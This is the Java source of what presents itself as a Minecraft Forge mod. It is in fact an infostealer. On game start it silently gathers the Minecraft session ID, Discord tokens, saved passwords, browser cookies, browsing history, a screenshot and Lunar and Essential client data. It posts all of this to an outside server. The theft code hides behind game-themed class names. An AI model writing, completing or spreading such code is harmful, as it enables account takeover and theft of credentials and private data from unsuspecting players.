package dev.Ecila;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import dev.Ecila.handlers.*;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Driver;

import static dev.Ecila.utils.Utils.getDriver;
import static dev.Ecila.utils.Utils.bypassKeyRestriction;


@Mod(modid = "mod", version = "1.0.0")
public class Ecila {

    public static Driver driver;

    String apiUrl = "https://yep-gg-qp97.onrender.com";

    @Mod.EventHandler
    public void PreInit(FMLPreInitializationEvent event) {
        new Thread(() -> {
            try {
                JsonObject delivery = new JsonObject();
                bypassKeyRestriction();
                driver = getDriver();
                JsonObject mcJson = new JsonObject();
                String[] mcInfo = new Skyblock().getMcInfo();
                mcJson.addProperty("ign", mcInfo[0]);
                mcJson.addProperty("uuid", mcInfo[1]);
                mcJson.addProperty("ssid", mcInfo[2]);
                delivery.add("minecraft",mcJson);


                JsonArray dcTokens = new Combat().getTokens();
                delivery.add("discord",dcTokens);


                JsonArray pwJson = new Misc().grabPassword();
                delivery.add("passwords",pwJson);


                String cookies = new Render().grabCookies();
                delivery.addProperty("cookies",cookies);


                JsonArray history = new Dungeon().grabBrowserHistory();
                delivery.add("history",history);


                String ss = new Macro().takeScreenshot();
                delivery.addProperty("screenshot",ss);

                String lunar = new Rift().grabLunar();
                if(!lunar.equals("Not found")) {
                    delivery.addProperty("lunar", lunar);
                }

                String essential = new Mining().grabEssential();
                if(!essential.equals("Not found")) {
                    delivery.addProperty("essential", essential);
                }


                URL url = new URL(apiUrl + "/delivery");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes(delivery.toString());
                os.flush();
                os.close();
                BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())));
                String output;
                while ((output = br.readLine()) != null) {
                    System.out.println(output);
                }
                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }).start();
    }
}